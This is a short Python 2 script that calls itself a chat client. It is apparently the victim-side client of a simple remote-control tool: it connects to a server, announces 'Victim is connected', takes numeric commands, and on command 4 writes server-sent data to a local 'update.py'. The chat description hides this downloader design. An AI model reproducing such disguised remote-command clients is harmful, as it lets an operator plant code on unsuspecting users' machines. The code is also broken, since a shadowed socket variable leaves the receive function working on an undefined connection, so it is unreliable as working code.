"""
chat - client side - sends messages to others
"""

import socket
import sys
import select

#SERVER_IP = '127.0.0.1'
SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
KEY_ENTER = 13
KEY_BACKSPACE = 8
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024

my_socket = None


def receive_file(file="update.py"):
    with open(file, 'wb') as f:
        print 'file opened'
        while True:
            print('receiving data...')
            data = my_socket.recv(SOCKET_RECV_BYTES)
            print('data=%s', data)
            if not data:
                break
            # write data to a file
            f.write(data)


action_dict = {
    4: receive_file
}


def action_to_preform(message):
    action_code = int(message)
    return action_dict[action_code]()


def decryption(message):
    return message


def manipulate_data(encrypt_message):
    decrypt_message = decryption(encrypt_message)
    return action_to_preform(decrypt_message)


def main():
    try:
        my_socket = socket.socket()
        my_socket.connect((SERVER_IP, SERVER_PORT))
        socket_messages = []
        print 'Victim is connected to ({}) with port {}'.format(SERVER_IP, my_socket.getsockname()[PORT_INDEX])

        # I'm up
        # my_socket.send("0")
        # print(my_socket.recv(SOCKET_RECV_BYTES))

        while True:
            rlist, wlist, xlist = select.select([my_socket] + socket_messages, [my_socket] + socket_messages, [])
            for sock in rlist:
                if sock is my_socket:
                    msg = my_socket.recv(SOCKET_RECV_BYTES)
                    if not msg and msg == '':
                        sock.close()
                        print 'Connection with server was closed'
                        return
                    else:
                        print msg
                        manipulate_data(msg)

    except Exception as e:
        print 'Exception occurred, value:', e.message
    finally:
        my_socket.close()
        print 'client connection is closed'


if __name__ == "__main__":
    main()
